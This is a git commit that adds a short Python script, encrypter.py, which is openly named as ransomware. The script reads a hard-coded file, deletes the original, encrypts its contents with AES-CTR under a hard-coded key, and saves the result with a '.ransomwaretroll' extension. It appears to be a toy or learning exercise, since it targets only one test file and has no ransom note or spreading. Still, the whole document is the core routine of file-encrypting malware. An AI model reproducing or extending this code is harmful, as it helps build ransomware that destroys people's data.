1472281bfd31095be4616e8bbe1d371de30d1ed4
Felipe Reis <101122779+felipereis2704@users.noreply.github.com>
2023-03-20 01:01:43 -0300

    Add files via upload

---
+++ encrypter.py
@@ -0,0 +1,24 @@
+import os
+import pyaes
+
+## open the file to be encrypted
+file_name = "teste.txt"
+file = open(file_name, "rb")
+file_data = file.read()
+file.close()
+
+## remove the file
+os.remove(file_name)
+
+## encryption key
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+## encrypt the file
+crypto_data = aes.encrypt(file_data)
+
+## save encrypted file
+new_file = file_name + ".ransomwaretroll"
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
